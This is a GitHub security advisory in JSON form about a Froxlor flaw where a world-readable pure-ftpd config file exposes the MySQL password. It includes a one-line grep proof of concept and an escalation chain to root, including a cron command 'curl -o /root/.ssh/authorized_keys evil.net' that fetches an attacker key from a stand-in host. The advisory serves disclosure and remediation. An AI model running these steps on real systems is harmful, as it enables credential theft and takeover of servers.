{
  "schema_version": "1.4.0",
  "id": "GHSA-34qg-65m4-f23m",
  "modified": "2024-08-23T18:54:31Z",
  "published": "2024-08-23T18:54:30Z",
  "aliases": [],
  "summary": "Froxlor: /etc/pure-ftpd/db/mysql.conf is chmod 644 but contains <SQL_UNPRIVILEGED_PASSWORD>",
  "details": "### Summary\nIn Froxlor 2.1.9 and in the HEADs of the `main`, `v2.2` and `v2.1` branches , the XML templates in `lib/configfiles/` set `chmod 644` for `/etc/pure-ftpd/db/mysql.conf`, although that file contains `<SQL_UNPRIVILEGED_PASSWORD>`. At least on Debian 12, all parent directories of `/etc/pure-ftpd/db/mysql.conf` are world readable by default, thus exposing these credentials to all users with access to the system. Only Froxlor instances configured to use pure-ftpd are affected/vulnerable.\n\n### Details\nhttps://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075\n\n### PoC\nAs non-privileged user:\n```\nnobody@mail:/tmp$ grep MYSQLPassword /etc/pure-ftpd/db/mysql.conf\nMYSQLPassword   MySecretMySQLPasswordForFroxlor\n```\n\n\n### Impact\nAny unprivileged user with \"command/code execution\" access to the system can trivially obtain the credentials granting access to the `froxlor` MySQL database. This holds true even for virtual users without SSH access as long as they are able to upload their own PHP scripts or other CGIs, and works even if the admin has setup a separate php-fpm pool that runs as their own user.\n\nSide note: This access to the database can be leveraged to obtain Froxlor admin privileges, and subsequently root privileges. For example:\n1. Use the database credentials to extract or change a Froxlor admin's password hash and TOTP seed value.\n2. Log into Froxlor as that admin.\n3. Set the `Cron-daemon reload command` in `/admin_settings.php?page=overview&part=crond` to something like `curl -o /root/.ssh/authorized_keys evil.net`.\n4. Wait a few minutes until the relevant cronjob runs, then log in via SSH.\n\n\nPlease consider using passwordless unix socket authentication. Current versions of MySQL, MariaDB and Percona allow completely removing/omitting database passwords for database connections going through a unix socket, this works even for use cases where the database user has a different name than the system account running the database client:\nhttps://dev.mysql.com/doc/refman/5.7/en/socket-pluggable-authentication.html",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"
    },
    {
      "type": "CVSS_V4",
      "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Packagist",
        "name": "froxlor/froxlor"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.2.0"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 2.2.0-rc3"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/froxlor/Froxlor/security/advisories/GHSA-34qg-65m4-f23m"
    },
    {
      "type": "WEB",
      "url": "https://github.com/froxlor/Froxlor/commit/5d2ce4ecfb0e9c397ef5c73b107fb9a0e122e910"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/froxlor/Froxlor"
    },
    {
      "type": "WEB",
      "url": "https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-732"
    ],
    "severity": "HIGH",
    "github_reviewed": true,
    "github_reviewed_at": "2024-08-23T18:54:30Z",
    "nvd_published_at": null
  }
}